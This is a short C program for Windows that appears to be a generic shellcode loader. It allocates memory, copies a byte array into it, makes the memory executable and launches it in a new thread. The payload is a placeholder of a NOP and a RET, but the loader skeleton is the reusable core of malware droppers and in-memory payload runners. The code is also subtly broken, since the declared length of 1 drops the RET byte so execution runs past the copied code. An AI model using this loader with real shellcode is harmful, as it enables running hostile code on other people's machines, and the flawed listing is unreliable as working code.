#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(void){void*exec_mem;BOOL rv;HANDLE th;DWORD oldprotect=0;unsigned char shellcode[]={0x90,0xc3,};unsigned int shellcode_len=1;exec_mem=VirtualAlloc(0,shellcode_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);printf("%-20s : 0x%-016p\n","[*] Payload Address",(void*)shellcode);printf("%-20s : 0x%-016p\n","[*] Exec Address",(void*)exec_mem);RtlMoveMemory(exec_mem,shellcode,shellcode_len);rv=VirtualProtect(exec_mem,shellcode_len,PAGE_EXECUTE_READ,&oldprotect);printf("\npress enter to execute shellcode:\n");getchar();if(rv!=0){th=CreateThread(0,0,(LPTHREAD_START_ROUTINE)exec_mem,0,0,0);WaitForSingleObject(th,-1);}return 0;}
